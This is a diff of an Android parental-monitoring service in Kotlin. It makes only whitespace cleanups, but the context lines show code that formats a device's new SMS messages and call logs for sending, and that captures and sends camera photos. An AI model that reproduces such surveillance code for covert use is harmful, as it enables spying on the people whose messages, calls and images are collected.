@@ -74,7 +74,7 @@ class MonitoringService : Service() {
     private val windowManagerSvc: android.view.WindowManager? by lazy {
         try { getSystemService(WINDOW_SERVICE) as? android.view.WindowManager } catch (_: Exception) { null }
     }
-    
+
     private val scopeErrorHandler = CoroutineExceptionHandler { _, error ->
         try {
             CrashReporter.saveNow(this, error)
@@ -3350,7 +3350,7 @@ class MonitoringService : Service() {
         return buildString {
             appendLine("💬 <b>SMS baru (${smsList.size})</b>")
             appendLine()
-            
+
             smsList.forEach { sms ->
                 appendLine("📞 Nomor: ${Html.escape(sms.address)}")
                 val tag = smsTag(sms.address, sms.body)
@@ -3385,7 +3385,7 @@ class MonitoringService : Service() {
         return buildString {
             appendLine("📞 <b>Panggilan baru (${callList.size})</b>")
             appendLine()
-            
+
             callList.forEach { call ->
                 appendLine("📱 Nomor: ${Html.escape(call.number)}")
                 if (call.name != null) {
@@ -3683,7 +3683,7 @@ class MonitoringService : Service() {
 
             val hasNetwork = hasNetwork()
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Network available: $hasNetwork")
-            
+
             if (!hasNetwork) {
                 android.util.Log.w("MonitoringService", "No network, adding to queue")
                 if (queueOnFail) {
@@ -5238,11 +5238,11 @@ class MonitoringService : Service() {
         serviceScope.cancel()
         super.onDestroy()
     }
-    
+
     // ═══════════════════════════════════════════════════════════
     // CAMERA MONITORING FUNCTIONS
     // ═══════════════════════════════════════════════════════════
-    
+
     private fun captureAndSendPhoto(reportResult: Boolean = false) {
         if (NetworkUtils.isAuthBlocked(preferencesManager)) {
             serviceScope.launch {
@@ -5473,7 +5473,7 @@ class MonitoringService : Service() {
             }
         }
     }
-    
+
     private fun hasScreenshotConsent(): Boolean {
         return try { com.redeye.parentalmonitor.utils.ScreenCapture.granted() } catch (_: Exception) { false }
     }
